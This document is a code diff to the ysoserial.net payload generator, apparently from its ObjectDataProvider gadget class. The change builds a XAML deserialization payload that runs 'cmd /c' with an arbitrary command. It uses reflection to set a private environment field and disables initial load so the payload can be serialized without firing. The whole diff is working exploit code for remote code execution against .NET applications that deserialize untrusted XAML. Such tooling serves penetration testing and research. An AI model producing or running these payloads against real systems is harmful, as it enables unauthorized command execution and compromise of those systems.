@@ -11,6 +11,8 @@ using YamlDotNet.Serialization;
 using System.Windows.Markup;
 using System.Diagnostics;
 using System.Windows.Data;
+using System.Reflection;
+using System.Collections.Specialized;
 
 namespace ysoserial.Generators
 {
@@ -35,16 +37,20 @@ namespace ysoserial.Generators
         {
             if (formatter.ToLower().Equals("xaml"))
             {
-                ProcessStartInfo si = new ProcessStartInfo();
-                si.FileName = cmd;
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "cmd";
+                psi.Arguments = "/c " + cmd;
+                StringDictionary dict = new StringDictionary();
+                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
-                p.StartInfo = si;
+                p.StartInfo = psi;
                 ObjectDataProvider odp = new ObjectDataProvider();
                 odp.MethodName = "Start";
+                odp.IsInitialLoadEnabled = false;
                 odp.ObjectInstance = p;
 
-                string payload = XamlWriter.Save(odp);
-     
+                string payload  = XamlWriter.Save(odp);
+
                 if (test)
                 {
                     try
@@ -58,7 +64,6 @@ namespace ysoserial.Generators
                     }
                 }
                 return payload;
-
             }
             if (formatter.ToLower().Equals("json.net"))
             {
